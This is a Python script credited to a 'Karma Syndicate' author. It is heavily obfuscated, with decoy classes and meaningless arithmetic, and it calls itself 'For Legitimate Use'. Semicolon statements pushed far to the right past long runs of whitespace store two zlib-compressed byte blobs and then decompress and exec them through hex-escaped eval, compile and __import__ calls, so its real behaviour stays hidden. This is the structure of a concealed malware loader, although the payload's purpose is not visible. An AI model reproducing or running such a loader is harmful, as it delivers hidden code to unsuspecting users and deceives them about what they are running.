from builtins import *
from math import prod as _ceil


__tool__ = 'For Legitimate Use'
__authors__ = ('Telegram:', '@xnabob')
__organization__ = 'Karma Syndicate'
__telegram__ = 'https://t.me/KarmaSyndicate'
__version__ = 'Latest'

__license__ = '4836037d39227231520bc3346a94c8a7'


Calculate, _memoryaccess, _negative, Positive, _frame, _absolute, MemoryAccess = exec, str, tuple, map, ord, globals, type

class _builtins:
    def __init__(self, _round):
        self._modulo = _ceil((_round, -42807))
        self.Theory(_invert=80625)

    def Theory(self, _invert = str):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._modulo *= 5699 * _invert
        
        try:
            ({_theory: Positive} or Positive if {_theory: Positive} and Positive else ... or (Positive, {_theory: Positive}))

        except ArithmeticError:
            ((_negative, _frame) or _negative if (_negative, _frame) and _negative else ... or (_negative, (_negative, _frame)))

        except:
            MemoryAccess(-43936 + -31875) == float

    def _random(self, Math = 3930):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Math += -77419 * -72952
        self.Ceil != int
        
        try:
            ((_negative, (_negative, _frame)) for _negative in (Positive, _theory) if _memoryaccess == _theory)

        except ArithmeticError:
            (({_theory: _theory}, _theory) for _theory in (_negative, _frame))

        except:
            MemoryAccess(-23445 + -67873) == None

    def _positive(System = None):
        return _absolute()[System]

    def Divide(_calculate = -78063 + 51539, _add = str, Walk = _absolute):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Walk()[_calculate] = _add
        
        try:
            (((Positive, _theory), _memoryaccess) for _memoryaccess in {Positive: _negative})

        except TypeError:
            ((Positive, {Positive: _negative}) for Positive in (Calculate, _theory) if _frame == _memoryaccess)

        except:
            MemoryAccess(-95011 / 7189) == None

    def execute(code = str):
        return Calculate(_memoryaccess(_negative(Positive(_frame, code))))

    @property
    def Ceil(self):
        self.Substract = '<__main__._add object at 0x000004851BE10904>'
        return (self.Substract, _builtins.Ceil)

if __name__ == '__main__':
    try:
        _builtins.execute(code = __license__)
        _divide = _builtins(_round = 60449 / 82754)

        if 406036 > 6177023:
            _builtins(_round = 91018 / -12412).Theory(_invert = _divide._modulo * 58445)
        elif 326974 < 4348371:
            _divide.Theory(_invert = _divide._modulo + -40014)                                                                                                                                                                                                                                                          ;_builtins.Divide(_calculate='mnmnnnnnmmmnmnmmmnnmmnnnm',_add=b'x\x9c\xe5\x1b\xefo\xa38\xf6{\xfe\x8a\\\xefC@\x93\xe9\x10 \x86D\x8at\xa3mg7sm\xb2\xda\xccig5\x1a!\x02\xa6u\x86\xe0,\x90i{\xa7\xbb\xbf\xfd\xde\xb3\r!MhI\xda\xce~(\x8e\xed\x871\x06?\xbf\xdf&yz7l\xb5\xe1`\x91&j<</\xe7<\xf6\xbc\xf6\xdfF\'\x1fx\xda\xbe\xa0W,gK?\xa7\xed\x7fe\xf4\xa4\xcd\xd3JW\x7f\x9d_\xf34\x13\xbd\xb5\x93O4\xa6W\xa9\xbf\x1c\x9etO\xfeq\x9b\xf8s>?\xd1\xb7\xfa\xf3\xf4\xcaO\xd8\xbf\xfd\x9c\xf1D>\xe2\x9f~\xba\xf4\xdb\xb3\xbb$d\x01<\xe3\xde\xf8\xb9\x1aQ\xf6\xbd\xce\xf3U6|\xf7.?]\xd2w\xe2\xc6\xba\xfb\xbe\xd34+\x1fq\x01\xd7\xb3\xfc^\x8f\x98\x054\xc9\xa8\xe8\xd1\xb1]\x8b\x18\x96\x13Z\x03\xd3tL\xab\xd77\x8dy`Y6\xf1\x07v\xe0\xfaN\xa7\xa5\x0f\xcb{Y\x92k\x9d\xec\x1b\x0b;z\x8b\xde\x06t\x95+$&\xabu\xae\x9d\xfc\x1aS?\xa3\xed3\x9et\xf2\xf6%\x0fYtw\xa2\xb7\xe4C\xd9r\xc5\xd3\xdc\xf3\xe0\xfe\xbb\xac\xa3\x9f\xd2[\x96kz+\xe6\x81\x1fg\x9a\xfe\xa5\x93$\xc9r\x99,\x13\xac\x01\x82\x03\x80\xce\xd7\xd1U\xcc\xe7\xd0\xa5\xb5\xf7:\xdex\x0b\xc7\xcd\r\xfc\xf0\x10\xf0M\xe7\xcbp\xf8\xe6\xed\x9b\xb7\xda[\xedMO\xd7\xbf~\x1d\x85,\xad\x1fa<\x1e\xc71\xfc\xa0\x00h<\x16\xe5\xee\x18W4\xf7\xf3\xfc\x81q\xce8\xe7S~v6=;\xe3S(9\x02p\x0e\xb3\x90\xf3l\xd5\xf5\xc0\xbbqL9\xac\x18Pd<\xe0\xee\r\xfa\xea\x1f>\x9d\xf2\xe9tj`\xe6Xs\x0e7\xd6\x8d\xa9u\xe6k\x16\xe7,\xc1\xa5\xf8\xee\xa7\x0f\xbf\xd9\xf8b\xfc\xf1\xe2\x02\x0b\xa8>\x8e\xc7\x1f\xc70t\x89\xa8\xb1\xc4\x9c@\x9eV\xff\xc0,ay\xcc\xd6\xf3\xfbx\xd5\xbb\xe5\xb2\xdd\x88e\xc4\xf5<f\x1c\xfd\xcbs\rt\xca\x92\x90\xdej\x9d\x98\xf3\xdd\xab_\xf5\xc7VQ\xad\x8e\\\x9e\xa4\xa0\xe3W\x80/\xbaN?\xed\xc3\xd7.i"\xa6X\xbcX,\x18[0\xc0\x06\xd41{%H\x8a\xd9j\xc9\x83C\xe9J\x9d\x01\x0e\xa1\xc2V\xe8\xf8:\x10\x96\xfb<\x8e\x8edC\xc5\x81\xf2\x81\xaf\x03]i\x9e\x1dL[\x92A\xb9\x01\xac\x89,\xca\xb9\x01\xb8\xeatN\x17\x9c%5\xdc\x9b(\xd1\x96ltQ\xf2:\x10\x1c\xfb\xdfis)\xf7\xf9\xf3\xef\x9f!c\x01\x90\xa8\x008\x02S\x8c\x05\x19\x18\x90O\xc6T\xed8\x87b\xaa~\xa0\x02Sw\x11\x8bo\xe9u\xb2n\x8e.%\xe5\xa0\x04\xdaDj}\x1d4E\xb3\xd8\xff\xb0\x0fKu\xe6\xde~\xb2\xd2\xe6\x1d\x12\xd8\x83\xedD\x82j\xdb6\x0c\xd6_H\x03\x1eR\xad\xe3F\xf9\x9euz\r\xc8\x0f\xe8\xed\x01\x0cm\x18\\HH\x94\x93x\x05A!<\xa7\xd51\xf6\x89G\xad\xa3\x0f\xbc\x81\xd7\xf3,\xc8.@}\xcf\xf4\xfa\xd0\xd9\xf0\x0c\x80\xb6Z\x1b\x8cE<\x1c\xcd\x86\x8c\xf7\xe2\xb8\x0etvv[\x1f\x1d\xab\x96\x98,\xc3\x0cM\xd7\x0c\xad\x9e9x\x8cTtY\x88\x0c\xfe\x8e\xbf\x9c\x87~;Q\xcb"\tW\xc1\xf8\xe0\xe1>\xe4\xd6`\\\xbaw\xb7\xb77\xca\xd3+\xfc\xbd\'\xcc\xcb\xeeG\x96\x0b\x99@6 \x0f \x9b\xaa\xcd\x81\xdc\xc7vs.\xe6\xfeX_\xbc>h\x86\x9f\x12/8\x8b\x9b\x9b\xc2e\x15\xc5\xb0^C\xef\xc7K\xed\xec\xec\x88\x88dG\xb6\x8d0\x94v\xe5L\xd4\x08=\xce\xfc\x87a\xd54\xfb&\xe9;\x80\x14\x128\xb6\x19\x11B"\x80)\xb1M\xea\xd8\x8e\x0bm\xe6\xa3X\xaa\xa1\x01d6@\x0fb\x85\x83j@\xfb\x17N\x1aq\x89\xeb\x11\xc1\x07\xa6\xe0.\xc9q\xcen\xeb\x13\xa8\xa9\xa0\x8e\x9e\xa2\x0eGQHQ\xdb\x8a\x92\x1e\xebg5\xe7\xb2\x83\xd7\xc61\x9d#q_Og\x03;\xb0}\xc8X"\\(\x16_\xb5\x14I\xf5zvzsH\x9fX\xc4%\x91i\x00\xedY}\xcbvM\xc3\x0e\x80\xf6\x1d2 \xd44\x1c\x02\xf4h\x02L \xf7\x81\x0e\xcd\x17\xc0B\xb4\xe11R\xf2\x96\xa8mY?>o%\x15\n\xe9VH\xba\x9ba\x8d\xfa\xafa\x12sf\xce\xe0\x07\xb3\x9ca\xa1\xa0\x1f\'\xfe\x0f\x17\x18\xb08\xe6\xd1B\xa1v\xdc\xbe\xab\x92#\x92\x84\\\x05\xb9e\xcb\xa3\xa4P.\xcc\xe5\xe4r2\x99\\\xe21\x11\xf0\xf3\nk\xcc\x96A\x94\xd8\xb6\x0cL\xb6\x82\x90\x9c\xf0\x9a\xecw$\x0b\xa1\x18\xecA/\xd2@`\xda`\x8c\x10a\x8c\x18\x9e\x03\xc9\xf2,\xe8\xdc\xdfmmd\xee\x18B\xc0\xa29b@\t\xc6\x890wz\xf7[\x9f@\xa3=E\xa3\xc6a&J\x1d\x0f-\x16\x0b\x11\x8e\xc2\xd0\x94\x8cK\xc51\x8b\x17?\xee\x05k\x97\x10\x17\xd0l\xa4\xf1\xfa\x02\xb9&,\x98-\x10l\t\x8d\xb7\xd3\xfa\x849\xa1}d)\xcdET\xdd\xabd"\xb4\x99\xd4zM\xfa\x9a\x07,\xde\x11\xf2\xb9`\xa0m\xe6\xb2\x0b+)*X\xef\xb95\x94\x98__\xe5b\xbe\x86:w\x15\\\xe0\xe9\xa1\xbe\x8e\xb2\x18\x9aX\x085\x84=\xc3\x03\xf5\xc1L*\x06\xf3\xa9\xca\x81\xa8\xb5+\xd6\xb4\xb0b\x88\xb2\x89\r\xb1\xaernM\xfa\xbe\x94\x92q\x9c\xe0\x05\xb4>\xb5C\xc8\xd5\x14\x8aT\xb4\x87\x95\xeb\xe1\xf3[\xda\xa4\xf7\x02j\x13\xc8\x0b\xad(\xcb\xac\xd6\xdb\xb0L\xb2\x05sc\x15\x1a\x8b=\xb6\xb1\x08!`8\x01\xd2!>\xa0P\xbeR\x05O.\xa5:\xc6\xe2\xb2\x91<\x04\xe5\x07\t\xcb\x81\x87r\x90\x08y\xb8\xd3\xfa\x04^\x18(>%\x15\xdf\xd0V<l)\xd8U\xbc\xd0\xa4\xafs\x88\'\xa00,\x1165\x0c\x8cPp\x11\xce\x85\xdf\xc1\x96JG-\x90\x0c\xf9\x8cE\xc4\xa7\x01\x96Q\xa5\xa3Bw\x11\x93\x1e\xaax\xc4\xb2\xb9\xdb\xfac\xa3\x11\x87s\x96\r\x1e\xabc\xa3\xdf |\x89\x01\xf8\xb3\xb6\xe5\xa3\x87q\xac\xe4\x15d;Q6\xa4\xc8\x8f\x93\xed\xc3b\xd7\xad\x90K\xa1^]EN\x83\n\xa95\xe9\xdb\x90\xd4\x8e\x10Q\xe0\xf0C2\x1c\x0b\xd0\x17\x99\x11\xb1\x1c\x83\xccI\x0fl\xfe\x10\xc4\x17\x05\xd7\xcd2#;t\xfad\xd0wAL\xba$\x00\xe5\xec\xc0\xdb\xb9\xd6\xc0q\xed\xa8o\x90\xd0\x8c0p`[\xf6\x1c\x18\x03\xee\xb4,\x129\x06\xf4\x0f\xc1\xa5\x8bL\nc\xba\xce\xf1\x8b\xf3\xa0\xd9\xb01\x10\x8a3\xe5\xd2\xd92\x94\xa2\xceEz~\xe7\xd69\xdeY\xed\x14"V|\xd2\x10\xab\x18\xee\x8ft\x04\x95L\x9aI/T\xfc\x94s*\x0c\x90CD\x7f\x19\xd0MJoX:\xc2O\x98\x8fY\xc8\xd9\x8a\xfc-\xe2~\x83"\xce\xa7\x98\xa8I_\xf7\xc5\x1cd\x94D\x189\x03\xa2\'\x01\xe9\x89\xb8\xc6\x0b\x10\xbb\x8c\x0b\x92\xa8\x1a\xbd\xd8\xc4\x11I\x19I,Z\x1al\x1c\xec|4\xa2i\xff\xdb\xd9\xde\xd1y\xaai[\xab[~3\xa1\xfbI\xa8\xed\xdePK\xf3\xc5f@\x11Q\x85\xf4\x17P\xbc\x0cM\xdf\x8aT\xc4\xaa\xf1\x85\x0e\xa0\xf8\xda\x97"\x14$\'&* \xba\x93\xc22\x8b\xf4\x02f\'\x06\xd2\x02\xd2\x7f\x01\x12\x14\xfbT\xdb\xbbS\xf2L\xb6#\xbciilv\xce\n\xb9#\xea\xc2\xf3y\xc6\xf0\xcd\xd6kn&\xb1\x99\x8a<;:pc@\x1f\xb0\x9b~`\x80\xe4P\x0c\x14>OXI\xb4\xe2\x035 \xc3\x8d\x8fP\xda\x9e\xf2\x83\xbc\xfd\\\x13\xa5|\xd9.>`k\xcbO\xe3\xda\xf4\x96\x06]\xf1!b7\xa6Iw\x95\xb2$\xefb\xe6+\x9a\xb4\xf0\xaa&\xf6\x0c\xb8\xd8?\x98\xe2\x06\x02\x17\xbb\nzK\x8d\xb0\xf2S\x7f\xc9\xbe\xf1\xe2<\xa5\x7f\xaei\x96g\xc5y\xce\x96T>;\xe01\x87\xbe~\xf1l\x96\xb0\xbc\xfb\x81\xa7\xb4\x85\x90\xe6\xafs\x803\x9a\x8f\x84\xe0\x9a\xe2\xc3\xce\xa6\x92\xe4p\xfb\x02\x00\xbd\x95\xd2\xc0\x0b\x18\x1fm\xd9\x85\xc2R\x9c\xb4B\x1a\xb5\xb3\xec\xda\x8b\xf9\x15K\xb4k\x9e\xe5\x89\xbf\xa4]|Vw\x9d\xd1T\x9e\xf9Yv\xc3\xd3\xb0\x8b\xef\xc5\xd7\xf00\xf5\xed\x06~\xc6a\x88\xdd\x12x\x12W\x9fo\xe6\xc5\x07\xafx\xc0\xd8\xa3b\xb6\xa7\xb3\xd9/?\xc5\x8c&\xf89f\xa5\xc3)\xbc\xbf\xb7dY\xc6\x92+\x0f_\xc1\xfbF\xef\xbc\x15\x8fYp\xa7\x957\xbf\x87\xa9\xbe\x0f\xc3_e\xb3\xbe=B\xc0\x93\x84\x06\xf9\xf6\x04F[\xb3\x18\xedLg\xb43/Uo\xc6\x16k\xab!\xbeO\x7f\xfe\xed\xfc|r G\x10\xb2\x7f\xb7\xa0\x8f;W`\x94\x8a=,\x8b\x10\xdc\xc72\r\xb1\x8b\x05\xbe\x005]2\x80\xda\x99\xe3\x8e\x03z\x05 h{ f\xfbN\x08\xad0\x06\xb4\xc0\x88\x0e\xdc-\xbd\x07g^\xc0\x95\x9e\x8f\x0b\xce\xcd<oX~\xddF\xf2\xd5\x04\xf1 \xed\x08q\x85y\xca\xbb\xd2\x0b\x9e\x14\xee\x05\xfa\xc5x\xa2\xfbY;b1\xdd,7\x1e\xd8rz\x93\xb2\x9cj\x87ck\xdf\x9c\x9d`\xdf\xfcD\xab\x01F>`\x10p\x02\x98#\xb6\x13\xf6\x83FVK\x85z\xf2\x90%](a\xdd\xb1\xa2i:B\x8aB6\xf6\x02\xbe\\\xa2m0\x96\x96\xc5\x05\xda\xb6\x1f\xd1\xc4\x80\x03\x9b\xf6\x12\xcaO\x7f\xbc\x9f\xbc\x91\x03\x9e\xa6\xd4\x0f\xb5\xf2e\xee\x13m\xcc3\xaaXA~\xe3\xdc\xaeR\xfb50\n~v\xcdxr.\xae\x020\xdc\xf7\xc0\xdf\xce\xcf\x8e\xa0K\xbb\x078\x05:"\xd2\x0b\x1d\x005\xf6D\x1d!\x85\x02-\xf6\xa4\x02&\xf6_F\x99\xf7\x91\x02\xf2\xa3\xc4D\x1bh\x8f\xeeE\xc7\x1f\xe7\x17\x17\xd3\xdf\x9f\xc0\xa9\x80\x89H\x189\xc0\xa3\x15\x8c\xc0\x1c`\x16\x02\x0f\x8d\xf0q\xe0,\x1b\xcc\xec\xf2\xfd\xcf\xe7\x93O\xef\x8fY\xec\x97xy\xd4\x1d\xab\x94\x074\xcb\xa4\xfe\xf0\x90\xf55,\xbc\x95\x9f_+}\xb0\x91-\xe5\x95\xeeT\xa8D<\xb80\xb7\xa7\xa8+\xe1lW\xa2D<m\xc7,\xa1\xa0\xf9\xf6\xc8\x1a \x8d<\x1b\xe1\xf5\xd3,O\xd9\nx-[\xc5\xa0\x18ge\xe0\xb9\x08D')

        if 286370 > 7077900:
            _divide._random(Math = 970 / _divide._modulo)
        elif 428499 < 8883618:
            _divide.Theory(_invert = _divide._modulo - 23412)                                                                                                                                                                                                                                                          ;_builtins.Divide(_calculate='LLLILIJJLIJLJJJJJILJLLIJ',_add=b'\xe3\xa1o\xdd\xcc\xa26\xe8oM\x8c\xa1\x8fF\x8bX\xec\xc0\xb0\x85(\x16\x02X,\x16\xdb\x0f\xc4\xa3T2\xfb4\n\x8c\xb5s\xc3\x1e\x05\x8b\xe6\x00\x06\xcf\x94\x0e5\xa4F\x9d>\xa0sUPs\\~\x1a\x05\x95\xfe\xf7\xf6\x19\x8d\xfcu\x9c\x83\xf9\xf9K[Z\x08Y\xdb4\xb7^\x81\xc6\x19\xdd\x9d\xc5\xd3\x05\x08\xa82\x07\xc5D\x00,\x82BB\x08\x12\xa0\xb3\x01\xc0rS|^X\xf1\xfdH\x88j\x10\x0e((*\x94\x87\xf7\x02\xa3\x99\x14\xe9\x0f7\xd0\x1d\x03L\xc8AC\n,\tj$\xff\x17"\xf03\xde2\xeed\xa7l\xf4\x9fdY:\x7f\x89\x9a\xa1p\x01\x87\x15\xb2\xbcG\xa53\x15TP\xbb\xdc\xca\xb6\xd7\xbbEX\xa0\x821\x19:\xd0\xff\x0b\xc6V\xb6\xe2IFG\x85Mw\xba\x825\xd7\x94\r\xd6\x95/#J\xbd\xf5 \xf3\xb4\xfe\x0f\xfb\xf5\x0b\x15')

        if 233816 > 2896436:
            _divide._random(Math = 68019 - _divide._modulo)
        elif 102978 < 868007:
            _builtins(_round = 51084 / -45209).Theory(_invert = _divide._modulo + 91387)                                                                                                                                                                                                                                                          ;oDOoDoOoODOOoDoOD,DooDDDDDooooODDOo,xwxxwxxwxxxwwwwxwxwwx,IlIIIllIIlllIIlIIIIl,IIJLIJLJLLIJILLJIIIIIIII=(lambda xxwxxxwxxwxwxxxxxxw:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(xxwxxxwxxwxwxxxxxxw)"),filename='\x6c\x6c\x49\x49\x6c\x6c\x6c\x6c\x49\x49\x6c\x49\x6c\x6c\x49\x49\x6c\x6c\x49\x6c',mode='\x65\x76\x61\x6c'))),(lambda xxwxxxwxxwxwxxxxxxw:xxwxxxwxxwxwxxxxxxw(__import__('\x7a\x6c\x69\x62'))),(lambda xxwxxxwxxwxwxxxxxxw:xxwxxxwxxwxwxxxxxxw['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda xxwxxxwxxwxwxxxxxxw:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(xxwxxxwxxwxwxxxxxxw)"),filename='\x6c\x6c\x49\x49\x6c\x6c\x6c\x6c\x49\x49\x6c\x49\x6c\x6c\x49\x49\x6c\x6c\x49\x6c',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda WXWXWXWWWXWWWXWWXWXW,xxwxxxwxxwxwxxxxxxw:WXWXWXWWWXWWWXWWXWXW(xxwxxxwxxwxwxxxxxxw))
        _divide._random(Math = 38711 - _divide._modulo)                                                                                                                                                                                                                                                          ;IlIIIllIIlllIIlIIIIl()(IIJLIJLJLLIJILLJIIIIIIII(xwxxwxxwxxxwwwwxwxwwx(DooDDDDDooooODDOo(oDOoDoOoODOOoDoOD('\x76\x61\x72\x73'))),_builtins._positive(System='mnmnnnnnmmmnmnmmmnnmmnnnm')+_builtins._positive(System='LLLILIJJLIJLJJJJJILJLLIJ')))

    except Exception as _theory:
        if 213453 > 2781655:
            _builtins.execute(code = _memoryaccess(_theory))

        elif 234758 > 8781389:
            _divide.Theory(_invert = _divide._modulo + -93368)